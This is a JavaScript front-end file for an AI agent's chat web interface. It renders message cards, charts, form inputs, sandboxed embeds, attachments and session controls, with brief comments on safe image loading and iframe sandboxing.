        const r = Math.min(4, w / 2, h);
        svg.appendChild(svgEl('path', {
          d: `M${x} ${top + h} V${top + r} Q${x} ${top} ${x + r} ${top} H${x + w - r} Q${x + w} ${top} ${x + w} ${top + r} V${top + h} Z`,
          fill: color(j), class: 'bk-mark',
        }));
      }));
    } else {
      values.forEach((vals, j) => {
        const pts = vals.map((v, i) => `${xMid(i)},${y(v)}`);
        if (chart.type === 'area') {
          svg.appendChild(svgEl('polygon', {
            points: `${xMid(0)},${y(0)} ${pts.join(' ')} ${xMid(vals.length - 1)},${y(0)}`,
            fill: color(j), 'fill-opacity': series.length > 1 ? 0.18 : 0.28,
          }));
        }
        svg.appendChild(svgEl('polyline', { points: pts.join(' '), fill: 'none', stroke: color(j), 'stroke-width': 2 }));
      });
    }

    // One hit column per category: hover or focus shows every series there.
    const cross = svgEl('line', { y1: T, y2: H - B, class: 'bk-cross', visibility: 'hidden' });
    svg.appendChild(cross);
    cats.forEach((c, i) => {
      const hit = svgEl('rect', { x: L + band * i, y: T, width: band, height: H - T - B, fill: 'transparent', tabindex: 0 });
      const show = (e) => {
        if (chart.type !== 'bar') {
          cross.setAttribute('x1', xMid(i)); cross.setAttribute('x2', xMid(i));
          cross.setAttribute('visibility', 'visible');
        }
        const r = hit.getBoundingClientRect();
        showTip(card, e.clientX || r.left + r.width / 2, e.clientY || r.top,
          c, series.map((s, j) => [s.name, fmtNum(values[j][i]), color(j)]));
      };
      const hide = () => { cross.setAttribute('visibility', 'hidden'); hideTip(card); };
      hit.addEventListener('pointermove', show);
      hit.addEventListener('focus', show);
      hit.addEventListener('pointerleave', hide);
      hit.addEventListener('blur', hide);
      svg.appendChild(hit);
    });

    const wrap = el('div', 'bk-series-wrap');
    if (chart.axis_config && chart.axis_config.y_label) wrap.appendChild(el('div', 'bk-axis-title', chart.axis_config.y_label));
    wrap.appendChild(svg);
    if (chart.axis_config && chart.axis_config.x_label) wrap.appendChild(el('div', 'bk-axis-title x', chart.axis_config.x_label));
    if (series.length > 1) wrap.appendChild(legend(series.map((s, j) => [s.name, color(j)]), chart.type === 'bar' ? 'box' : 'line'));
    return wrap;
  }

  function renderChart(block) {
    const card = el('figure', 'bk-chart-card');
    card.appendChild(el('figcaption', 'bk-chart-title', block.title || ''));
    const chart = block.chart || {};
    card.appendChild(chart.type === 'pie' ? renderPie(card, chart) : renderSeriesChart(card, chart));
    return card;
  }

  function renderInput(element) {
    const id = element.action_id || '';
    const options = element.options || [];
    if (element.type === 'static_select') {
      const select = el('select', 'bk-select');
      select.dataset.actionId = id;
      select.appendChild(el('option', '', textOf(element.placeholder) || 'Choose')).value = '';
      options.forEach((o) => {
        const opt = el('option', '', textOf(o.text));
        opt.value = o.value;
        if (element.initial_option && element.initial_option.value === o.value) opt.selected = true;
        select.appendChild(opt);
      });
      return select;
    }
    if (element.type === 'checkboxes' || element.type === 'radio_buttons') {
      const group = el('div', 'bk-choices');
      group.dataset.actionId = id;
      const chosen = new Set([...(element.initial_options || []), ...(element.initial_option ? [element.initial_option] : [])].map((o) => o.value));
      const name = `${id}-${Math.random().toString(36).slice(2)}`;
      options.forEach((o) => {
        const label = el('label', 'bk-choice');
        const input = el('input');
        input.type = element.type === 'checkboxes' ? 'checkbox' : 'radio';
        input.name = name;
        input.value = o.value;
        input.dataset.label = textOf(o.text);
        input.checked = chosen.has(o.value);
        label.append(input, document.createTextNode(textOf(o.text)));
        group.appendChild(label);
      });
      return group;
    }
    if (element.type === 'datepicker') {
      const input = el('input', 'bk-date');
      input.type = 'date';
      input.dataset.actionId = id;
      if (element.initial_date) input.value = element.initial_date;
      input.title = textOf(element.placeholder);
      return input;
    }
    return null;
  }

  // What every input in the card is set to, in the same words as agent/block_state.py.
  function cardState(card) {
    const lines = [];
    card.querySelectorAll('[data-action-id]').forEach((node) => {
      const name = node.dataset.actionId.replace(/^card_input_/, '');
      let value;
      if (node.tagName === 'SELECT') {
        value = node.value ? `${node.selectedOptions[0].textContent} (${node.value})` : 'nothing selected';
      } else if (node.tagName === 'INPUT') {
        value = node.value || 'not set';
      } else {
        const chosen = [...node.querySelectorAll('input:checked')].map((i) => (i.dataset.label === i.value ? i.value : `${i.dataset.label} (${i.value})`));
        value = chosen.join(', ') || 'nothing selected';
      }
      lines.push(`- ${name}: ${value}`);
    });
    return lines;
  }

  function renderActions(block, card) {
    const row = el('div', 'bk-actions');
    (block.elements || []).forEach((element) => {
      if (element.type !== 'button') {
        const input = renderInput(element);
        if (input) row.appendChild(input);
        return;
      }
      const label = textOf(element.text);
      if (element.url) {
        const a = el('a', `bk-button${element.style ? ` ${element.style}` : ''}`, label);
        a.href = safeUrl(element.url);
        a.target = '_blank';
        a.rel = 'noopener noreferrer';
        row.appendChild(a);
        return;
      }
      const button = el('button', `bk-button${element.style ? ` ${element.style}` : ''}`, label);
      button.type = 'button';
      if (!label || !/^card_prompt_/.test(element.action_id || '')) {
        button.disabled = true;
      } else {
        // Asks the label the person sees, never a hidden prompt (listeners/actions/card_prompt_actions.py).
        button.addEventListener('click', () => {
          const state = cardState(card);
          const text = `${label}\n[from a button click: they clicked the "${label}" button on your card. ` +
            "This is the button's label, not a message they typed: do what the button offers.]" +
            (state.length ? `\nThe card's inputs at the time:\n${state.join('\n')}` : '');
          if (cardPromptSender) cardPromptSender(text);
        });
      }
      row.appendChild(button);
    });
    return row;
  }

  function renderBlocks(blocks) {
    const card = el('div', 'bk-card');
    (blocks || []).forEach((block) => {
      switch (block.type) {
        case 'header':
          card.appendChild(el('h3', 'bk-header', textOf(block.text)));
          break;
        case 'section': {
          if (block.text) {
            const div = el('div', 'bk-section');
            div.innerHTML = mrkdwnToHtml(textOf(block.text));
            card.appendChild(div);
          }
          if (block.fields) {
            const grid = el('div', 'bk-fields');
            block.fields.forEach((f) => {
              const div = el('div', 'bk-field');
              div.innerHTML = mrkdwnToHtml(textOf(f));
              grid.appendChild(div);
            });
            card.appendChild(grid);
          }
          break;
        }
        case 'markdown': {
          const div = el('div', 'bk-section');
          div.innerHTML = renderMarkdown(block.text || '');
          card.appendChild(div);
          break;
        }
        case 'context': {
          const div = el('div', 'bk-context');
          div.innerHTML = (block.elements || []).filter((e) => e.text).map((e) => mrkdwnToHtml(e.text)).join(' ');
          card.appendChild(div);
          break;
        }
        case 'divider':
          card.appendChild(el('hr', 'bk-divider'));
          break;
        case 'image': {
          // Same rule as images in replies (isLoadableImage): a card can be made at anyone's
          // request, and loading its image from anywhere would send what's in the URL there.
          if (!isLoadableImage(block.image_url)) {
            const link = el('a', 'bk-link', block.alt_text || 'image');
            link.href = safeUrl(block.image_url) || '#';
            link.target = '_blank';
            link.rel = 'noopener noreferrer';
            card.appendChild(link);
            break;
          }
          const img = el('img', 'bk-image');
          img.src = safeUrl(block.image_url);
          img.alt = block.alt_text || '';
          img.loading = 'lazy';
          card.appendChild(img);
          break;
        }
        case 'table':
        case 'data_table':
          card.appendChild(renderTable(block));
          break;
        case 'data_visualization':
          card.appendChild(renderChart(block));
          break;
        case 'actions':
          card.appendChild(renderActions(block, card));
          break;
        default:
          break;
      }
    });
    linkifyExternal(card);
    return card;
  }

  function handleAgentMessage(ev) {
    const turn = ensureTurn();
    const content = turn.querySelector('.turn-content');

    if (ev.variant === 'final') {
      const div = document.createElement('div');
      div.innerHTML = renderMarkdown(ev.text || '');
      linkifyExternal(div);
      content.appendChild(div);
      return;
    }
    if (ev.variant === 'status') {
      const line = document.createElement('div');
      line.className = 'status-line';
      line.innerHTML = renderMarkdown(ev.text || '');
      linkifyExternal(line);
      content.appendChild(line);
      return;
    }
    if (ev.variant === 'image') {
      const card = document.createElement('div');
      card.className = 'image-card';
      const img = document.createElement('img');
      img.src = safeUrl(ev.url);
      img.alt = ev.alt_text || '';
      card.appendChild(img);
      content.appendChild(card);
      return;
    }
    if (ev.variant === 'file') {
      const card = document.createElement('div');
      card.className = 'file-card';

      if (isImageFilename(ev.filename || ev.url)) {
        const img = document.createElement('img');
        img.className = 'file-preview';
        img.src = safeUrl(ev.url);
        img.alt = ev.filename || '';
        card.appendChild(img);
      }

      const row = document.createElement('div');
      row.className = 'file-row';

      const link = document.createElement('a');
      link.href = safeUrl(ev.url);
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.className = 'file-label';
      link.textContent = ev.title || ev.filename || 'File';
      row.appendChild(link);

      const dl = document.createElement('a');
      dl.href = safeUrl(ev.url);
      dl.download = ev.filename || '';
      dl.className = 'file-download';
      dl.title = 'Download';
      dl.setAttribute('aria-label', `Download ${ev.filename || 'file'}`);
      dl.appendChild(icon('i-download'));
      row.appendChild(dl);

      card.appendChild(row);
      content.appendChild(card);
      return;
    }
    if (ev.variant === 'card') {
      content.appendChild(renderBlocks(ev.blocks));
      return;
    }
    if (ev.variant === 'embed') {
      // A live embed (desktop/browser stream, rendered HTML, a whiteboard) —
      // shown inline as a real iframe, the way Slack unfurls it, not as a
      // static link. Sized generously and never overflow-clipped, since a
      // cropped desktop stream is worse than a link.
      const card = document.createElement('div');
      card.className = 'embed-card';

      const head = document.createElement('div');
      head.className = 'embed-head';
      const link = document.createElement('a');
      link.href = safeUrl(ev.url);
      link.target = '_blank';
      link.rel = 'noopener noreferrer';
      link.className = 'embed-label';
      link.textContent = ev.title || ev.url;
      head.appendChild(link);
      card.appendChild(head);

      const frame = document.createElement('iframe');
      frame.className = 'embed-frame';
      frame.src = safeUrl(ev.url);
      frame.title = ev.title || 'Embedded content';
      frame.loading = 'lazy';
      frame.allow = 'clipboard-write; fullscreen';
      frame.referrerPolicy = 'no-referrer';
      // allow-same-origin is safe here because the embed is always a
      // cross-origin URL (the coolton file server / whiteboard / desktop
      // stream, never this page's own origin) — it's what the noVNC desktop
      // stream needs for its own storage/WebSocket use. Deliberately no
      // allow-top-navigation: framed content (including model-authored HTML
      // via send_html_embed) must never be able to navigate this page away.
      frame.sandbox = 'allow-scripts allow-same-origin allow-forms allow-popups';
      card.appendChild(frame);

      if (ev.text && ev.text !== ev.title) {
        const caption = document.createElement('div');
        caption.className = 'embed-caption';
        caption.textContent = ev.text;
        card.appendChild(caption);
      }

      content.appendChild(card);
    }
  }

  function endTurn(ev, opts) {
    const turn = activeTurnEl || ensureTurn();
    turn.classList.remove('working');
    const failed = ev.state === 'error' || ev.state === 'stopped';
    if (failed) turn.classList.add('failed');

    if (turn.querySelectorAll('.spine-node').length) {
      turn.querySelector('.spine-group').hidden = false;
      updateStepCount(turn);
      // Finished work collapses to a single line; open it to read the log back.
      turn.classList.add('steps-collapsed');
    }

    if (failed) {
      const note = document.createElement('div');
      note.className = `turn-end-note state-${ev.state}`;
      note.textContent = ev.state === 'stopped' ? 'Stopped' : (ev.reason || 'Something went wrong');
      turn.querySelector('.turn-content').prepend(note);
    } else if (ev.state === 'skipped') {
      const note = document.createElement('div');
      note.className = 'turn-end-note state-skipped';
      note.textContent = 'Skipped';
      turn.querySelector('.turn-content').prepend(note);
    }

    activeTurnEl = null;
    isStopping = false;
    if (opts && opts.replay) return;
    isWorking = false;
    updateComposerState();
    updateStatusBar('idle');
    markSidebarWorking(currentConversationId, false);
    refreshSidebarMeta();
  }

  // A session names itself after its first message (web/runner.py), so the
  // sidebar and header pick that up once the turn it started has landed.
  // Also the only thing that notices a turn finishing in a session that
  // isn't the one currently open — there's no SSE stream for it (that only
  // exists for the current conversation), so its "working" dot would
  // otherwise stay lit forever once that background turn lands. Called right
  // after our own turn starts/ends, and polled on a timer (below) so a
  // turn finishing elsewhere is caught too.
  function refreshSidebarMeta() {
    apiJson('/api/conversations').then((rows) => {
      for (const row of rows) {
        const title = (row.title || '').trim();
        setSidebarTitle(row.id, title);
        markSidebarWorking(row.id, !!row.working);
        if (row.id === currentConversationId && statusTitleEl.isConnected) {
          statusTitleEl.textContent = title || UNTITLED;
        }
      }
    }).catch(() => {});
  }

  function handleReaction(ev) {
    const target = messageElBySeq.get(ev.target_seq);
    const container = target && target.querySelector('.row-reactions');
    if (!container) return;
    if (ev.op === 'add') {
      const badge = document.createElement('span');
      badge.className = 'reaction-badge';
      const glyph = emojiFor(ev.emoji);
      if (glyph) {
        badge.textContent = glyph;
      } else {
        const img = document.createElement('img');
        img.className = 'emoji-img';
        img.src = CUSTOM_EMOJI_URL(ev.emoji);
        img.alt = `:${ev.emoji}:`;
        badge.appendChild(img);
      }
      badge.title = `:${ev.emoji}:`;
      badge.dataset.emoji = ev.emoji;
      container.appendChild(badge);
    } else {
      const badge = container.querySelector(`[data-emoji="${CSS.escape(ev.emoji)}"]`);
      if (badge) badge.remove();
    }
  }

  // ---------------------------------------------------------------------
  // Renaming a session
  // ---------------------------------------------------------------------

  statusTitleEl.addEventListener('click', () => {
    if (!currentConversationId) return;
    const current = statusTitleEl.textContent === UNTITLED ? '' : statusTitleEl.textContent;
    const input = document.createElement('input');
    input.className = 'title-input';
    input.value = current;
    input.placeholder = 'Name this session';
    input.maxLength = 80;

    let settled = false;
    const finish = async (save) => {
      if (settled) return;
      settled = true;
      const title = save ? input.value.trim() : current;
      input.replaceWith(statusTitleEl);
      statusTitleEl.textContent = title || UNTITLED;
      if (save && title !== current) {
        setSidebarTitle(currentConversationId, title);
        try {
          await api(`/api/conversations/${currentConversationId}`, {
            method: 'PATCH',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ title }),
          });
        } catch (err) {
          console.error('Failed to rename session', err);
        }
      }
    };

    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); finish(true); }
      if (e.key === 'Escape') { e.preventDefault(); finish(false); }
    });
    input.addEventListener('blur', () => finish(true));

    statusTitleEl.replaceWith(input);
    input.focus();
    input.select();
  });

  // ---------------------------------------------------------------------
  // Composer
  // ---------------------------------------------------------------------

  function updateComposerState() {
    // Send stays available while coolton works — a message sent mid-turn steers
    // the run in flight rather than queueing a second one.
    stopBtn.hidden = !isWorking;
    stopBtn.disabled = isStopping;
  }

  function autoGrow() {
    composerInput.style.height = 'auto';
    composerInput.style.height = Math.min(composerInput.scrollHeight, 200) + 'px';
  }
  composerInput.addEventListener('input', autoGrow);
  composerInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      composerEl.requestSubmit();
    }
  });

  async function sendText(text, attachments) {
    if (!currentConversationId) await createConversation();
    if (!currentConversationId) return;
    try {
      await api(`/api/conversations/${currentConversationId}/messages`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ text, attachment_ids: (attachments || []).map((a) => a.id) }),
      });
    } catch (err) {
      console.error('Failed to send message', err);
    }
  }
  cardPromptSender = sendText;

  composerEl.addEventListener('submit', async (e) => {
    e.preventDefault();
    const text = composerInput.value.trim();
    if (!text && !pendingAttachments.length) return;

    const attachments = pendingAttachments;
    pendingAttachments = [];
    renderAttachmentTray();
    composerInput.value = '';
    autoGrow();
    await sendText(text, attachments);
  });

  stopBtn.addEventListener('click', async () => {
    if (!currentConversationId || isStopping) return;
    // Say so immediately: the halt lands at coolton's next checkpoint, which can
    // be a second or two into a long tool call.
    isStopping = true;
    updateComposerState();
    updateStatusBar();
    try {
      await api(`/api/conversations/${currentConversationId}/stop`, { method: 'POST' });
    } catch (err) {
      console.error('Failed to stop the run', err);
      isStopping = false;
      updateComposerState();
      updateStatusBar();
    }
  });

  attachBtn.addEventListener('click', () => fileInput.click());
  fileInput.addEventListener('change', async () => {
    for (const file of fileInput.files) await uploadAttachment(file);
    fileInput.value = '';
  });

  composerEl.addEventListener('dragover', (e) => e.preventDefault());
  composerEl.addEventListener('drop', async (e) => {
    e.preventDefault();
    for (const file of e.dataTransfer.files) await uploadAttachment(file);
  });
  composerInput.addEventListener('paste', async (e) => {
    const files = Array.from((e.clipboardData && e.clipboardData.files) || []);
    for (const file of files) await uploadAttachment(file);
  });

  async function uploadAttachment(file) {
    if (!currentConversationId) await createConversation();
    if (!currentConversationId) return;
    const chip = document.createElement('div');
    chip.className = 'attachment-chip';
    chip.textContent = `Uploading ${file.name}…`;
    attachmentTray.hidden = false;
    attachmentTray.appendChild(chip);
    try {
      const form = new FormData();
      form.append('file', file);
      const resp = await api(`/api/conversations/${currentConversationId}/attachments`, { method: 'POST', body: form });
      if (!resp.ok) throw new Error(`upload failed: ${resp.status}`);
      const meta = await resp.json();
      meta.media_type = file.type;
      pendingAttachments.push(meta);
      renderAttachmentTray();
    } catch (err) {
      console.error('Attachment upload failed', err);
      chip.remove();
      if (!attachmentTray.children.length) attachmentTray.hidden = true;
    }
  }

  function renderAttachmentTray() {
    attachmentTray.innerHTML = '';
    if (!pendingAttachments.length) { attachmentTray.hidden = true; return; }
    attachmentTray.hidden = false;
    for (const a of pendingAttachments) {
      const chip = renderAttachmentChip(a);
      const remove = document.createElement('button');
      remove.type = 'button';
      remove.className = 'remove-attachment';
      remove.textContent = '×';
      remove.title = `Remove ${a.name || 'attachment'}`;
      remove.addEventListener('click', () => {
        pendingAttachments = pendingAttachments.filter((x) => x.id !== a.id);
        renderAttachmentTray();
      });
      chip.appendChild(remove);
      attachmentTray.appendChild(chip);
    }
  }

  // ---------------------------------------------------------------------
  // Drawer (mobile)
  // ---------------------------------------------------------------------

  function closeDrawer() { appEl.classList.remove('drawer-open'); }
  drawerToggle.addEventListener('click', () => appEl.classList.toggle('drawer-open'));
  backdrop.addEventListener('click', closeDrawer);

  // ---------------------------------------------------------------------
  // Init
  // ---------------------------------------------------------------------

  // Doesn't create anything — see showDraftState's own comment. Only the
  // composer's first send (createConversation, below) actually POSTs one.
  newConvoBtn.addEventListener('click', () => {
    showDraftState();
    closeDrawer();
    composerInput.focus();
  });

  window.addEventListener('popstate', async () => {
    const id = new URLSearchParams(location.search).get('c');
    if (id) {
      if (id === currentConversationId) return;
      try {
        await selectConversation(id, { skipHistory: true });
      } catch (err) {
        console.error('Failed to open conversation from history', err);
        showDraftState({ skipHistory: true });
      }
    } else if (currentConversationId) {
      showDraftState({ skipHistory: true });
    }
  });

  async function init() {
    const params = new URLSearchParams(location.search);
    if (params.has('signed_out') || params.has('auth_error')) {
      // Bail before any authenticated call (api()'s own 401 handler would
      // otherwise bounce straight back through /oauth/login itself).
      history.replaceState(null, '', location.pathname);
      renderAuthScreen(
        params.has('signed_out') ? "You're signed out." : "Sign-in didn't go through. Try again."
      );
      return;
    }
    try {
      await emojiMapReady;
      await loadMe();
      // "/" on its own (no ?c=) is the same starting point as New session,
      // not a jump into whichever conversation was updated most recently —
      // only a URL that actually names one opens it.
      await loadConversations(params.get('c') || undefined, { skipHistory: true });
    } catch (err) {
      console.error('Failed to initialize coolton web UI', err);
    }
    // Only the currently-open conversation has a live SSE stream, so a turn
    // finishing in any other one is otherwise invisible until this polls it.
    setInterval(refreshSidebarMeta, 10000);
  }
  init();
})();
